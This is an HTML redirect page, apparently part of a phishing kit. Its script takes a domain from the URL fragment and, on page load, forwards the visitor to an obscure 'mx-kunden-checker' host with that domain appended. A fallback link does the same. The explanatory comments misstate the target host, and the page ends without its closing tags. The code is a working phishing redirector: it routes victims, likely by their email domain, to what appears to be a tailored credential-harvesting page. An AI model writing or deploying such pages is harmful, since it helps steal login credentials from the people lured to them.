<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
        (function() {
            // This script runs in the user's browser, where it can access the URL fragment.
            
            // 1. Get the fragment from the URL (e.g., "#google.com").
            const hash = window.location.hash;
            
            // 2. Check if a fragment exists and has content.
            if (hash && hash.length > 1) {
                // 3. Remove the leading '#' to get the clean domain name.
                const domain = hash.substring(1);
                
                // 4. Construct the correct destination URL for your Node.js app.
                // Resulting URL will be: https://mx-checker.com/google.com
                const destinationUrl = 'https://logical-panel.rogur.part-mx-kunden-checker.com/xAbdGzXK' + domain;
                
                // 5. Redirect the browser to the new URL.
                // Using replace() is better than assigning to href as it doesn't create an entry in the browser history.
                window.location.replace(destinationUrl);
            } else {
                // Optional: If no domain is in the URL hash, redirect to the base app URL.
                window.location.replace('https://logical-panel.rogur.part-mx-kunden-checker.com/xAbdGzXK');
            }
        })();
    </script>
</head>
<body>
    <p>You are being redirected. If nothing happens, please <a id="fallback-link" href="https://logical-panel.rogur.part-mx-kunden-checker.com/xAbdGzXK">click here</a>.</p>
    <script>
        // Also update the fallback link for users with JavaScript disabled (though they won't redirect).
        const hash = window.location.hash;
        if (hash && hash.length > 1) {
            const domain = hash.substring(1);
            document.getElementById('fallback-link').href = 'https://logical-panel.rogur.part-mx-kunden-checker.com/xAbdGzXK' + domain;

        }
    </script>
